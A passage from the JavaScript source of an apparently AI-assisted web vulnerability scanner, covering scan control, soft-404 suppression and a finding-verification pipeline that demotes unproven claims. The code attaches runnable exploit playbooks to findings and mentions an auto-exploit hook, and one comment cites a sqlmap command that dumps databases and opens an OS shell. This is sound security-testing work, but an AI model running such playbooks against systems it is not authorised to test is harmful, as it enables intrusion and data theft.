   * finish() only writes the DB status; call releaseDeferredFinish() after the
   * last stage so the notification goes out exactly once — with the complete
   * finding set.
   */
  deferFinish(scanId) {
    this._deferredFinish.add(scanId)
  }

  /** Lift the deferral installed by deferFinish() so finish() notifies normally. */
  releaseDeferredFinish(scanId) {
    this._deferredFinish.delete(scanId)
  }

  /**
   * Reset per-scan state before a run starts.
   *
   * Required because re-run / retry-failed operate on the SAME scan id. Without
   * this the tombstone from the previous run would block control creation, and a
   * leftover `stopped: true` flag would abort the new run at its first
   * waitIfPaused() checkpoint.
   */
  _beginScan(scanId) {
    this._finishedScans.delete(scanId)
    this.control.delete(scanId)
    this._llmBudget.delete(scanId)
  }

  /** Drop every map entry keyed by this scanId. Safe to call more than once. */
  releaseScanState(scanId) {
    this.control.delete(scanId)
    this._llmBudget?.delete(scanId)
    this._lastProgressEmit?.delete(scanId)
    this._urlPool?.delete(scanId)
    this._scanDepth?.delete(scanId)
    // The deferral only spans the whitebox->blackbox handoff. index.js releases
    // it via releaseDeferredFinish() before the final finish(); clearing it here
    // guarantees a re-run of the same scanId is never silently muted.
    this._deferredFinish?.delete(scanId)
    this._loginForms?.delete(scanId)
    this._blackboxMeta?.delete(scanId)
    this._coverage?.delete(scanId)
    this._catchAllBaselines?.delete(scanId)
  }

  async detectCatchAllBaseline(scanId, targetUrl) {
    let base = String(targetUrl || '').trim()
    try {
      const u = new URL(ensureScheme(base))
      base = `${u.origin}${u.pathname.replace(/\/+$/, '')}`
    } catch {}
    const path = `/${crypto.randomBytes(10).toString('hex')}-probe-404`
    try {
      const { response: res } = await fetchWithHttpFallback(`${base}${path}`, { method: 'GET', redirect: 'manual', signal: AbortSignal.timeout(10000) })
      const body = await res.text()
      if ([200, 301, 302].includes(res.status)) {
        const baseline = {
          isCatchAll: true,
          status: res.status,
          contentLength: body.length,
          bodyHash: crypto.createHash('sha256').update(body.slice(0, 4096)).digest('hex'),
          isHtml: /<(!doctype|html|head|body)/i.test(body),
          title: extractHtmlTitle(body),
        }
        this._catchAllBaselines.set(scanId, baseline)
        this.log(scanId, 'info', `Catch-all baseline detected: HTTP ${res.status}, ${body.length} bytes${baseline.title ? `, title="${baseline.title}"` : ''}`)
        return baseline
      }
    } catch (err) {
      this.log(scanId, 'warn', `Catch-all baseline probe failed: ${err.message}`)
    }
    return null
  }

  _isSoft404Finding(scanId, finding) {
    const source = String(finding.module || '').toLowerCase()
    if (!source.startsWith('custom-script:') && source !== 'path-enum' && !/^native:(?:ffuf|gobuster)$/.test(source)) return false

    // Non-path findings (DNS, ports, SSL/TLS, redirects, rate-limits, headers, protocol features)
    // are infrastructure or behavioral findings — they are NEVER soft-404 SPA landing pages.
    const titleAndDesc = `${finding.title || ''} ${finding.description || ''} ${finding.evidence?.claim || ''}`
    if (/\b(?:dns|spf|dmarc|dkim|caa|zone transfer|wildcard dns|open port|non-standard port|tls|ssl|cipher|certificate|redirect|rate limit(?:ing)?|cookie|security header|alt-svc)\b/i.test(titleAndDesc)) {
      return false
    }

    const baseline = this._catchAllBaselines.get(scanId)
    if (!baseline?.isCatchAll) return false
    const evidence = responseEvidence(finding.evidence)
    // `status` is the anchor: when a probe emits no status the finding carries no
    // response metadata at all, and suppressing on a claim keyword alone would
    // drop genuine findings. The shipped probes therefore emit status explicitly.
    if (evidence.status !== baseline.status) return false
    const sizeMatches = evidence.contentLength != null && evidence.contentLength > 0 && baseline.contentLength > 0 &&
      Math.abs(evidence.contentLength - baseline.contentLength) / baseline.contentLength <= 0.02
    const hashMatches = Boolean(evidence.bodyHash && evidence.bodyHash === baseline.bodyHash)
    // Third branch: the response we actually received WAS the catch-all HTML
    // lander while the finding claims a machine-readable artefact (config, JSON,
    // upload, API payload). Those two facts cannot both be true, so the claim is
    // an artefact of the catch-all.
    //
    // NOTE: this branch is deliberately NOT `evidence.isHtml === false`. The
    // probe reaching here already has no size/hash match against the baseline, so
    // a non-HTML body is a genuinely DIFFERENT response — suppressing it would
    // discard real machine-readable findings on catch-all targets. `isHtml` is a
    // strict boolean from responseEvidence(), and the outer `baseline.isHtml`
    // conjunct already holds, so the honest test is "HTML came back, yet the
    // finding claims a machine-readable artefact".
    const nonHtmlClaim = /json|config|secret|upload|api|sql|database|file/i.test(
      `${finding.title || ''} ${finding.description || ''} ${evidence.claim}`,
    )
    return Boolean(sizeMatches || hashMatches || (baseline.isHtml && nonHtmlClaim && evidence.isHtml))
  }

  /**
   * Extract a fetchable URL from a custom-script finding.
   * Scripts typically embed the probed path in the title, e.g.:
   *   "Editor/temp file exposed: /index.php~"
   *   "Admin panel discovered: /admin (HTTP 200)"
   *   "Potential IDOR/BOLA: /api/v1/users/2 accessible without auth"
   */
  _extractProbeUrl(finding, target) {
    const base = /^https?:\/\//i.test(target) ? target.replace(/\/+$/, '') : `https://${target}`
    const title = finding.title || ''
    // Try to extract path from title patterns like ": /some/path" or ": /path (HTTP xxx)"
    const m = title.match(/:\s*(\/\S+?)(?:\s+\(|$|\s+accessible|\s+is\s|\s+returns|\s+without)/) ||
              title.match(/:\s*(\/\S+)/)
    if (m) {
      const path = m[1].replace(/[()]+$/, '')  // clean trailing parens
      try { return new URL(path, base).href } catch { /* invalid path */ }
    }
    // Fallback: check evidence for url/path fields
    const ev = finding.evidence || {}
    if (ev.url) return ev.url
    if (ev.path) {
      try { return new URL(ev.path, base).href } catch { /* skip */ }
    }
    return null
  }

  _targetFingerprint(scanId) {
    // `http-headers` carries the Server banner (e.g. "Apache/2.4.6 (CentOS)
    // PHP/7.4.33") and is ingested before both the custom-script gate and the
    // native path audit run, so the stack is known even when whatweb/httpx
    // were unavailable or produced nothing.
    const rows = db.all(`SELECT title, description, evidence FROM findings WHERE scan_id = ? AND module IN ('native:whatweb', 'native:httpx', 'http-headers')`, scanId)
    return rows.map(row => `${row.title || ''} ${row.description || ''} ${row.evidence || ''}`).join(' ')
  }

  _shouldSkipCustomScript(scanId, script) {
    const name = String(script.name || '')
    const fingerprint = this._targetFingerprint(scanId)
    const isLinuxPhp = /\b(?:linux|unix|centos|ubuntu|debian|apache|nginx|php)\b/i.test(fingerprint)
    const isCmsFramework = /\b(?:moodle|wordpress|drupal)\b/i.test(fingerprint)
    // Dedicated platform probes: skip ASP.NET on Linux/PHP targets.
    // Match name directly (e.g. "ASP.NET Security Checks") so general config-probing scripts
    // that check web.config alongside .env don't get skipped.
    if (isLinuxPhp && /\b(?:asp\.net|iis|elmah)\b/i.test(name)) return true
    // Dedicated Java / Spring Boot probes: skip on Linux/PHP targets.
    // Match name directly so generic scripts like "CSP Deep Analysis" (which mentions Java plugins) don't get skipped.
    if (isLinuxPhp && /\b(?:actuator|spring boot|websphere|jboss|tomcat|java)\b/i.test(name)) return true
    // Name-only for Laravel on purpose: the generic "Log File Exposure" probe
    // walks ~26 log paths, mentioning laravel.log once among them, and is
    // hardened + useful on this host class. Matching its command would suppress
    // it wholesale. Only the genuinely Laravel-only probes are skipped.
    if (isCmsFramework && /laravel/i.test(name)) return true
    if (/(?:price|amount|coupon|e-commerce|cart|checkout|order|buy|payment)/i.test(name) &&
      !/(woocommerce|magento|shopify|opencart|prestashop|wordpress ecommerce)/i.test(fingerprint)) return true
    return false
  }

  emit(scanId, event, data) {
    this.io?.to(`scan:${scanId}`).emit(event, data)
  }

  /**
   * Look up control state for a scan.
   *
   * `create === false` (read paths) returns the live entry or undefined and
   * NEVER inserts. `create === true` (an explicit pause/resume/stop request)
   * still must not resurrect a finished scan, otherwise every post-completion
   * API call leaks one map entry — `finish()` has already cleaned up, so the
   * entry would never be removed again.
   */
  _ctl(scanId, { create = false } = {}) {
    const existing = this.control.get(scanId)
    if (existing) return existing
    if (!create || this._finishedScans.has(scanId)) return undefined
    const ctl = { paused: false, stopped: false }
    this.control.set(scanId, ctl)
    return ctl
  }

  /** Pause a running scan (cooperative — takes effect at next checkpoint). */
  pauseScan(scanId) {
    const ctl = this._ctl(scanId, { create: true })
    if (ctl) ctl.paused = true
  }

  resumeScan(scanId) {
    const ctl = this._ctl(scanId, { create: true })
    if (ctl) ctl.paused = false
  }

  /** Stop a running scan — causes waitIfPaused to throw, aborting the loop. */
  stopScan(scanId) {
    const ctl = this._ctl(scanId, { create: true })
    if (!ctl) return
    ctl.stopped = true
    ctl.paused = false // unblock any pause waiter so the loop exits
    cancelNativeTools(scanId)
  }

  isPaused(scanId) { return this._ctl(scanId)?.paused === true }

  isStopped(scanId) { return this._ctl(scanId)?.stopped === true }

  /** Await while paused. Throws if stopped (aborts the scan loop). */
  async waitIfPaused(scanId) {
    while (this.isPaused(scanId) && !this.isStopped(scanId)) {
      await new Promise((r) => setTimeout(r, 400))
    }
    if (this.isStopped(scanId)) throw new Error('SCAN_STOPPED')
  }

  log(scanId, level, message) {
    const ts = new Date().toISOString()
    try {
      db.run(`INSERT INTO logs (scan_id, level, message, ts) VALUES (?,?,?,?)`, scanId, level, message, ts)
    } catch { /* scan may have been deleted mid-execution */ }
    this.emit(scanId, 'scan:log', { scanId, level, message, ts })
  }

  /**
   * Persist + broadcast scan progress. Emits a FLAT payload
   * `{ scanId, progress, status }` (throttled to ~4 updates/sec per scan).
   */
  progress(scanId, progress, status) {
    const pct = Math.max(0, Math.min(100, Math.round(progress)))
    try { db.run(`UPDATE scans SET progress = ? WHERE id = ?`, pct, scanId) } catch { /* non-fatal */ }
    const now = Date.now()
    this._lastProgressEmit = this._lastProgressEmit || new Map()
    const last = this._lastProgressEmit.get(scanId) || 0
    if (pct < 100 && now - last < 250) return
    this._lastProgressEmit.set(scanId, now)
    this.emit(scanId, 'scan:update', { scanId, progress: pct, ...(status ? { status } : {}) })
  }

  /** Persist a finding through the standard enrichment chain. Returns stored record. */
  async ingestFinding(scanId, rawFinding, { verify = true, targetType = 'url' } = {}) {
    // 0. Ensure target/asset is set for per-finding attribution
    if (!rawFinding.target) {
      const scan = db.get(`SELECT target FROM scans WHERE id = ?`, scanId)
      rawFinding.target = scan?.target || rawFinding.evidence?.url || ''
    }
    // Normalise the target once, at the boundary. Playbook builders interpolate
    // `${target}/.env`, so a target that already ends in `/` (a bare host root,
    // which is the common case for a site scan) produced `//.env` and `//.git` —
    // commands that target a protocol-relative path rather than the site root.
    if (typeof rawFinding.target === 'string' && rawFinding.target.length > 1) {
      rawFinding.target = rawFinding.target.replace(/\/+$/, '')
    }
    // Reject 404/410 on path/file/endpoint existence claims immediately
    const evStatus = Number(rawFinding.evidence?.status ?? rawFinding.evidence?.statusCode ?? rawFinding.evidence?.httpStatus)
    const isPathOrExposure = /admin|panel|discover|exposed|downloadable|backup|\.git|\.env|idor|swagger|api endpoint|sensitive file|metadata/i.test(`${rawFinding.title || ''} ${rawFinding.description || ''}`)
    const isErrorPageFinding = /error page|stack trace|custom 404|verbose error/i.test(`${rawFinding.title || ''} ${rawFinding.description || ''}`)
    if ((evStatus === 404 || evStatus === 410) && isPathOrExposure && !isErrorPageFinding) {
      this.log(scanId, 'info', `Suppressed 404 Not Found response for "${rawFinding.title}"`)
      return null
    }

    if (this._isSoft404Finding(scanId, rawFinding)) {
      rawFinding.evidence = { ...(rawFinding.evidence || {}), soft404: true, verification: 'soft-404-suppressed' }
      this.log(scanId, 'info', `Suppressed catch-all response for "${rawFinding.title}"`)
      return null
    }

      // ── OUT-OF-SCOPE TAGGING ──
      // Compare the finding's hostname to the primary scan target hostname.
      // Subdomains of the primary target are in-scope; unrelated hosts are tagged
      // out_of_scope so the report can group them under "Related Hosts" instead
      // of mixing them with primary-target findings.
      try {
        const scan = db.get(`SELECT target FROM scans WHERE id = ?`, scanId)
        const primaryTarget = scan?.target || ''
        const findingUrl = rawFinding.evidence?.url || rawFinding.target || ''
        if (primaryTarget && findingUrl) {
          const primaryHost = (() => { try { return new URL(primaryTarget.startsWith('http') ? primaryTarget : `https://${primaryTarget}`).hostname.toLowerCase() } catch { return String(primaryTarget).toLowerCase().replace(/\/.*$/, '') } })()
          const findingHost = (() => { try { return new URL(findingUrl.startsWith('http') ? findingUrl : `https://${findingUrl}`).hostname.toLowerCase() } catch { return String(findingUrl).toLowerCase().replace(/\/.*$/, '') } })()
          if (primaryHost && findingHost && findingHost !== primaryHost && !findingHost.endsWith(`.${primaryHost}`)) {
            rawFinding.evidence = { ...(rawFinding.evidence || {}), out_of_scope: true, primaryHost, findingHost }
          }
        }
      } catch { /* non-fatal */ }

      // 1. OWASP enrich
    // A custom script may serialize its own finding into evidence.raw. That is
    // bookkeeping, not target output; retaining it makes the verifier treat a
    // repeated title/description as proof of the claim.
    let f = removeNonEvidenceEchoes(enrichWithOwasp(rawFinding))
    let matchedExploitPlaybooks = []
    // 2. RAG PoC cross-reference
    try { f = payloadsRag.crossReference(f) } catch { /* non-fatal */ }
      // 2b. Attach matching exploit playbooks so every finding carries a
      // concrete, runnable attack path instead of an empty exploit section.
      try {
        const matched = matchExploits(f)
        if (matched.length) {
          matchedExploitPlaybooks = matched.slice(0, 5).map(p => ({
            id: p.id,
            risk: p.risk,
            techniques: (p.techniques || []).map(t => ({
              step: t.step,
              label: t.label,
              tool: t.tool,
              command: typeof t.args === 'function' ? t.args(f.target || '') : t.args,
              needsApproval: needsApproval(t, classifyRisk(f)),
            })),
          }))
          f.exploitPlaybooks = matchedExploitPlaybooks
        }
      } catch { /* non-fatal */ }
    // 3. AI verification (specialist-routed) — SKIP for AI-generated findings
    // (code-audit:* / ai-audit modules) since they are already LLM-verified.
    // Circular re-verification destroys the rich AI analysis and replaces
    // detailed descriptions with a 1-sentence verdict.
    //
    // ALSO SKIP AI verification for factual/observational findings that are
    // inherently true — their existence IS the evidence. Running AI verify
    // on these wastes LLM calls and risks the AI wrongly discarding facts.
    let verdict = null
    const isAiGenerated = (f.module || '').startsWith('code-audit') || (f.module || '') === 'ai-audit'

    // ── Misclassification overrule ───────────────────────────────────────────
    // A directory discovery tool reports a PATH, never an exploit. Upstream
    // escalation turned the ffuf wordlist hit `/ezsqliteadmin` into
    // "SQL Injection (CRITICAL 9.3)" on a scan where no SQL error was ever
    // observed and no parameter was ever proven injectable.
    //
    // This runs BEFORE the verification branch dispatch on purpose. The
    // reclassification used to live inside the observational (`else if (verify)`)
    // branch, but a finding titled "SQL Injection" matches the `ownsDomain`
    // keyword list, which routes it to the LLM branch instead — so the overrule
    // never executed for exactly the findings it exists to correct.
    const directorySource = /(?:ffuf|gobuster|dirsearch|feroxbuster|path-enum|dirb)/i.test(String(f.module || ''))
    // ── Claim verification gate ──────────────────────────────────────────────
    // A custom script's stdout IS the finding. Whatever severity string the
    // script author wrote into `emit` lands in the database, so a probe whose
    // only success condition is "HTTP 200 came back" can publish
    // `"severity":"critical"` with no exploitability proof at all. Measured on
    // one scan: 25 `.php` paths on a catch-all static host produced 23
    // "Possible webshell" HIGH findings because the content regex
    // `cmd|command|password|eval(` matches ordinary HTML.
    //
    // Severity is therefore a CLAIM, and this gate demotes the claim unless an
    // artifact that can only exist when the exploit worked was captured. The
    // demotion is to `medium` + a needs-validation tier, not `info`: a 200 on
    // `/shell.php` remains a real observation worth an analyst's time, it just
    // is not proof of code execution.
    {
      // A capture key proves a response was recorded; it does not prove the
      // claim. `findCaptures` accepts `status`, so every re-fetched 200 counts —
      // which is exactly how unverified `critical` findings kept their tier.
      // Extract the actual bytes instead and let the rules read them.
      const proofArtifact = claimArtifactText(f) !== ''
      const demoted = adjudicateClaimSeverity({
        title: f.title,
        severity: f.severity,
        description: f.description,
        evidence: { ...(f.evidence || {}), module: f.module },
        proofArtifact,
      })
      if (demoted) {
        this.log(scanId, 'info',
          `⚖️  claim demoted "${f.title}" ${f.severity} → ${demoted.severity}: no artifact proves ${demoted.claim}; evidence is a response, not an exploitation`)
        f.severity = demoted.severity
        f.cvss = null
        f.cvssVector = null
        f.exploitPlaybooks = []
        const { exploitPlaybooks: _staleClaimPlaybooks, ...claimEvidence } = f.evidence || {}
        f.evidence = {
          ...claimEvidence,
          unverifiedClaim: demoted.claim,
          validationTier: 'needs-validation',
        }
      }
    }

    // Adjudicate on the *claim*, never on the absence of a keyword. `sqlProof`
    // must be able to tell "an error-based injection was confirmed" apart from
    // "no SQL error was observed" — the negation-blind version read the denial
    // as proof and switched this overrule off on the very findings it targets.
    const sqlProof = hasSqlInjectionProof(`${f.title || ''}\n${f.description || ''}\n${JSON.stringify(f.evidence || {})}`)
    if (/sql injection/i.test(f.title || '') && directorySource && !sqlProof) {
      const misclassified = f.title
      f.title = 'Admin / Discovery Surface'
      f.description = `Directory discovery found this path, but no SQL error, injectable parameter, or database response was observed — it is an exposed surface, not a proven injection. ${f.description || ''}`.trim()
      f.severity = SEVERITY_RANK[f.severity] > SEVERITY_RANK.medium ? 'medium' : f.severity
      f.cvss = null
      f.cvssVector = null
      f.discoveryOnly = true
      // Drop the exploit playbooks attached at step 2b. They were matched on the
      // ORIGINAL "SQL Injection" title, so they survive a reclassification that
      // has just declared the claim unproven — leaving a runnable
      // `sqlmap --dbs/--dump/--os-shell` recipe on a path where no SQL error was
      // ever seen. Measured: re-matching the corrected claim against the registry
      // returns [] (the old wording returned ["sqli-exploit"]), so clearing is
      // lossless here — nothing the new claim legitimately justifies.
      f.exploitPlaybooks = []
      const { exploitPlaybooks: _stalePlaybooks, ...restEvidence } = f.evidence || {}
      f.evidence = { ...restEvidence, classification: 'discovery-only', validationTier: 'needs-validation' }
      this.log(scanId, 'info', `⚖️  reclassified directory hit "${misclassified}" — a wordlist path is a discovery surface, not an injection (no SQL artifact in evidence)`)
    }

    // Factual modules: the finding IS the evidence (nmap saw an open port,
    // HTTP response lacked a header, DNS resolved a subdomain, etc.)
    const factualModules = ['http-headers', 'path-enum', 'native:nmap',
      'native:subfinder', 'native:amass',
      'native:httpx', 'native:dnsbrute',
      'native:katana',
      'native:whatweb', 'native:wafw00f',
      'native:nikto', 'native:nuclei',
      'native:arjun', 'native:ffuf',
      'native:gobuster',
      'native:feroxbuster', 'native:dirsearch', 'native:gau', 'native:sslscan', 'native:masscan',
      'offensive:service-probe', 'offensive:login-surface', 'response-body-scan',
      'cookie-audit', 'cors-audit', 'form-harvest', 'api-discovery', 'offensive:default-creds',
      'version-audit', 'version-lifecycle']
    const isFactual = factualModules.includes(f.module) ||
      // Low/info findings from native tools are observational
      ((f.module || '').startsWith('native:') || (f.module || '').startsWith('chain:')) &&
      (f.severity === 'info' || f.severity === 'low')
    // Missing security headers, server banner, robots.txt, subdomain, open port — always factual
    const factualTitles = /missing.*security.*header|server.*header.*information|robots\.txt|subdomain|open port|httpx:|ffuf:|discovered/i
    // Some modules record a fact whose *security impact* still needs adversarial
    // reasoning (a `cors-audit` result can be a benign wildcard or a credentialed
    // session hijack). Those are the owning agent's domain, so they keep the full
    // LLM tier; everything else factual gets deterministic attribution below.
    //
    // The regex is deliberately narrow. It once matched the bare module or title
    // text, which meant `cors-audit` — a listed factual module — was captured by
    // its own name and could never take the self-evidencing path. The modules
    // whose facts are most security-relevant were therefore the exact ones always
    // forced through the model gate, and a model that declined to rule turned
    // them into unverified leads.
    const domainText = `${f.module || ''} ${f.title || ''}`
    const ownsDomain = /cors|auth|session|credential|token|injection|upload|traversal|smuggl|deserializ/i.test(domainText)
    const isFactualFinding = (!ownsDomain && isFactual) || (!ownsDomain && factualTitles.test(f.title || ''))

    const gate = verify && !isAiGenerated && !isFactualFinding
    let budgetBlocked = false
    if (gate && !this._takeLlmSlot(scanId)) {
      budgetBlocked = true
      this.log(scanId, 'info', `🤖 [AI] verification budget spent for this scan — attributing "${f.title}" deterministically instead of calling the model`)
    }

    // Discard and retention must be mutually exclusive. `runVerification()` used to
    // signal two different outcomes with one `return null` (a hard discard), while
    // the low-confidence branch signalled "keep" by mutating severity in place —
    // so a caller could not tell a dropped finding from a kept one without
    // re-deriving it from severity. That ambiguity is what let the block below
    // re-classify an already-discarded finding. The verdict is now explicit.
    let discarded = false
    const runVerification = async () => {
    if (gate && !budgetBlocked) {
      try {
        this.log(scanId, 'info', `🤖 [AI] verifying finding: "${f.title}" (severity=${f.severity}, module=${f.module})\n🤖 [AI] input evidence: ${JSON.stringify(f.evidence || {}).slice(0, 800)}`)
        const v = await aiEngine.verifyFinding(f, targetType)
        verdict = v
        // An undecided verdict (isTruePositive === null) is not a rejection. The
        // model was reached but nothing in the evidence settled the claim, so
        // calling it a false positive both hides a real lead and produced the
        // "❌ false positive (confidence=0)" line that made every scan look empty.
        const undecided = v.isTruePositive === null || v.isTruePositive === undefined
        const label = undecided
          ? '⚖️  undecided — no artifact settled it'
          : v.isTruePositive ? '✅ TRUE POSITIVE' : '❌ false positive'
        this.log(scanId, 'info', `🤖 [AI] verdict from ${v.agent || 'unknown-agent'}: ${label} (confidence=${v.confidence})\n🤖 [AI] reasoning: ${(v.verdict || '').slice(0, 1000)}`)
        if (undecided) {
          f.evidence = { ...(f.evidence || {}), verification: 'needs-validation', aiUndecided: true }
          this.log(scanId, 'info', `🤖 [${v.agent}] "${f.title}" kept as ${f.severity} but flagged needs-validation — the report files it under unverified leads, not confirmed findings`)
        } else if (!v.isTruePositive) {
          // Don't blindly discard — if AI confidence is low (< 60), keep the
          // finding with downgraded severity. The AI might be wrong.
          if (v.confidence != null && v.confidence < 60) {
            this.log(scanId, 'info', `🤖 [${v.agent}] low-confidence rejection (conf=${v.confidence}) — keeping as info: ${f.title}`)
            f.severity = 'info'
          } else {
            this.log(scanId, 'info', `🤖 [${v.agent}] discarded false positive (conf=${v.confidence}): ${f.title}`)
            discarded = true
            return null
          }
        }
        // `refined` is built as { ...finding } in ai-engine.js, so it carries the
        // PRE-verification evidence object and the PRE-verification severity. Letting
        // it replace `f` wholesale threw away every verdict stamp written above it in
        // this block — `aiUndecided` and the needs-validation tier — and let the
        // spread's stale severity silently undo a deliberate `f.severity = 'info'`
        // from the low-confidence rejection branch. Capture the verifier-owned fields
        // first, then re-assert them over the merge so the model's refinements and the
        // verifier's verdict coexist instead of the model overwriting the verdict.
        const verifierSeverity = discarded || f.severity === 'info' ? 'info' : null
        const verifierEvidence = { ...(f.evidence || {}) }
        if (v.refined) f = v.refined
        if (verifierSeverity) f.severity = verifierSeverity
        f.evidence = { ...(f.evidence || {}), ...verifierEvidence }
        // Only adopt the model's tier when the verifier has not already set one. A
        // needs-validation stamp is the verifier's own judgement and must not be
        // upgraded to `observed`/`validated` by a model that never saw the artifact.
        if (v.evidenceTier && !verifierEvidence.aiEvidenceTier) {
          f.evidence = { ...f.evidence, aiEvidenceTier: v.evidenceTier }
        }
      } catch (e) {
        this.log(scanId, 'warn', `🤖 [AI] verification error for "${f.title}": ${e.message} — keeping original finding`)
      }
    } else if (isAiGenerated) {
      // AI-generated findings are pre-verified — assign high confidence
      verdict = { agent: f.module, isTruePositive: true, confidence: 85, verdict: 'Verified by AI specialist agent during code audit.' }
      f.evidence = { ...(f.evidence || {}), aiEvidenceTier: 'validated' }
    } else if (verify) {
      // Observable findings (an open port, a missing header, a discovered path)
      // are self-evidencing: no model has to re-confirm the response the scanner
      // already captured. Attribute them to the owning agent anyway, so the
      // report always names a specialist and an artifact-backed reason instead
      // of rendering a blank AI panel.
      try {
        const v = aiEngine.attributeObservedFinding(f, targetType)
        verdict = v
        if (v.evidenceTier) f.evidence = { ...(f.evidence || {}), aiEvidenceTier: v.evidenceTier }
        this.log(scanId, 'info', `🔎 [${v.agent}] observational attribution (confidence=${v.confidence}): ${f.title}`)
      } catch (e) {
        this.log(scanId, 'warn', `🔎 [AI] attribution error for "${f.title}": ${e.message}`)
      }

      const verdictText = String(verdict?.verdict || '').toLowerCase()
      // Prose may only reject a finding when the scanner captured nothing. Where a
      // response exists it is the stronger evidence, and a model's opinion about
      // wording must not delete what the target actually returned.
      const hasLiveCapture = findCaptures(f).length > 0
      const rejectsFinding = Boolean(verdict) && !hasLiveCapture && (
        verdict.isTruePositive === false ||
        /(?:evidence|artifact)[^.]{0,60}(?:lack|missing|insufficient)|not\s+(?:a\s+)?(?:true\s+positive|exploitable)/i.test(verdictText)
      )
      if (rejectsFinding) {
        f.severity = 'info'
        f.evidence = { ...(f.evidence || {}), verification: 'needs-validation', aiEvidenceTier: 'needs-validation', aiVerification: false }
      }
    }
    } // end runVerification

    await runVerification()

    // A finding the verifier rejected outright owns the outcome; the downgrade
    // block below must not resurrect it as a "needs-validation" lead.
    if (discarded) return null

    // Keep playbooks available for the persisted finding and the guarded
    // auto-exploit hook, but do not expose them to the AI verifier as evidence.
    // They describe possible actions; they are never proof that the target is
    // vulnerable.
    if (matchedExploitPlaybooks.length) {
      f.evidence = { ...(f.evidence || {}), exploitPlaybooks: matchedExploitPlaybooks }
    }

    // A finding the reviewer judged to lack the artifacts its claim requires is
    // NOT verified, whatever severity upstream asserted, and must not reach the
    // Confirmed list. (The SQL-injection reclassification itself already ran
    // above, before dispatch, so this only has to adjudicate severity.)
    {
      const verdictText = String(verdict?.verdict || '').toLowerCase()
      // This block is the single largest source of discarded proof in the
      // codebase. It fires on prose alone, and the heuristic's own undecided
      // fallback used to read "no artifact in the finding evidence settles this
      // claim" — literally matching `lacksArtifacts` below — so the pipeline
      // stripped severity, nulled CVSS and stamped aiVerification:false on
      // findings that had a photographed HTTP response attached. 707 rows in the
      // production database carry both a capture and this stamp.
      //
      // Two guards now stand between prose and a real capture:
      //   1. a capture means there is an artifact, so "lacks artifact" is false by
      //      construction and this block must not run at all;
      //   2. an undecided verdict is not a rejection — it says exploitability was
      //      not determined, which is a reason to keep the lead, not to bury it.
      const captures = findCaptures(f)
      const hasLiveCapture = captures.length > 0
      const undecidedVerdict = verdict && (verdict.isTruePositive === null || verdict.isTruePositive === undefined)
      const lacksArtifacts = /(?:evidence|artifact)[^.]{0,60}(?:lack|missing|insufficient|unsupported|absent)|no\s+(?:sql\s+)?(?:error|artifact|proof|evidence|artifact)[^.]{0,40}(?:observed|found|present|captured)|unproven|not\s+(?:been\s+)?(?:confirmed|validated|verified)|cannot\s+(?:be\s+)?confirm/i.test(verdictText)
      if (verdict && !hasLiveCapture && !undecidedVerdict && (verdict.isTruePositive === false || lacksArtifacts)) {
        const before = f.severity
        f.severity = 'info'
        f.cvss = null
        f.cvssVector = null
        f.evidence = {
          ...(f.evidence || {}),
          verification: 'needs-validation',
          aiEvidenceTier: 'needs-validation',
          aiVerification: false,
          unconfirmedReason: String(verdict.verdict || '').slice(0, 400) || 'AI reviewer found no artifact supporting the claim.',
        }
        this.log(scanId, 'info', `⚖️  AI verdict overrules upstream severity: "${f.title}" ${before} → info (claim has no supporting artifact; filed under unverified leads)`)
      } else if (hasLiveCapture && verdict && verdict.isTruePositive === false) {
        // The scanner captured a response the model then argued against. Keep the
        // finding and its evidence, and record the disagreement instead of
        // silently discarding the capture — the operator decides on re-check.
        f.evidence = {
          ...(f.evidence || {}),
          captureRetained: true,
          conflictingAiVerdict: String(verdict.verdict || '').slice(0, 400),
        }
        if (f.severity !== 'info') f.evidence.verification = 'artifact-captured'
        this.log(scanId, 'info', `🔒 Capture retained for "${f.title}": the AI verdict contradicted a live response, so the artifact is preserved for re-check rather than discarded`)
      }
    }

    // 4. Stage 4 — PII / Secret Sanitization (scrub credentials, tokens, private IPs from evidence)
    const sanitized = sanitizeFinding(f)
    if (sanitized.evidence) f.evidence = sanitized.evidence
    if (sanitized.poc) f.poc = sanitized.poc

    // 5. Record a verification action so the finding's provenance is auditable
    // even when the pipeline is invoked with `verify: false`.
    if (verify) {
      const verifiedAt = new Date().toISOString()
      try {
        const action = verdict
          ? {
              at: verifiedAt,
              kind: 'verify',
              status: 'completed',
              by: verdict.agent || 'sentinelai',
              tier: verdict.evidenceTier || null,
              summary: verdict.verdict || null,
              target: f.target || null,
            }
          : {
              at: verifiedAt,
              kind: 'verify',
              status: 'skipped',
              by: 'pipeline',
              tier: null,
              summary: 'Verification disabled for this call (verify: false).',
              target: f.target || null,
            }
        const priorActions = Array.isArray(f.evidence?.actions) ? f.evidence.actions : []
        f.evidence = { ...(f.evidence || {}), actions: [...priorActions, action].slice(-25) }
        if (verdict && !verdict.evidenceTier) {
          this.log(scanId, 'info', `🔖 [${verdict.agent}] verification recorded for "${f.title}"`)
        }
      } catch { /* non-fatal */ }
    }

    // The tier recorded above may say "needs-validation" because the reviewer
    // could not settle the claim — and a captured response settles it regardless
    // of what the reviewer concluded, so the tier must not be re-stamped on top of
    // the reviewer's own decision.
    //
    // "Captured" means bytes, not a key. `findCaptures` treats `status` as a
    // capture, and `_runCustomScripts` attaches a `status` to *every* finding when
    // it enriches evidence after the fact — so keying the tier on it made
    // `capturedNow` unconditionally true and every `needs-validation` finding
    // rendered as confirmed. That is the mechanism that let an unverified claim
    // stay `high`/`critical` in the report while carrying a needs-validation
    // stamp: the stamp was written, then discarded one line later.
    //
    // Both spellings must still be honoured. The undecided branch stamps
    // `verification: 'needs-validation'` while the artifact-less downgrade stamps
    // `aiEvidenceTier: 'needs-validation'`; reading only the latter let an
    // undecided review fall through to evidenceTier() and render as "observed".
    const capturedNow = findCaptures(f).length > 0
    const hasArtifact = claimArtifactText(f) !== ''
    const flaggedUnverified = f.evidence?.aiEvidenceTier === 'needs-validation' || f.evidence?.verification === 'needs-validation'
    const tier = (flaggedUnverified && !hasArtifact)
      ? 'needs-validation'
      : evidenceTier(f, targetType)
    f.evidence = { ...(f.evidence || {}), validationTier: tier }

    // An unverified claim may not outrank its evidence. The AI reviewer's own
    // `needs-validation` stamp is a ceiling on severity, not a footnote: a finding
    // the reviewer declined to settle cannot ship as HIGH/CRITICAL while holding
    // no artifact a reader could check. Same treatment the discovery-only
    // reclassification above uses — severity capped at medium, CVSS withheld,
    // playbooks cleared — so unproven claims stay in the appendix and cannot
    // inflate the posture score.
    if (tier === 'needs-validation' && (SEVERITY_RANK[f.severity] ?? 0) >= SEVERITY_RANK.high) {
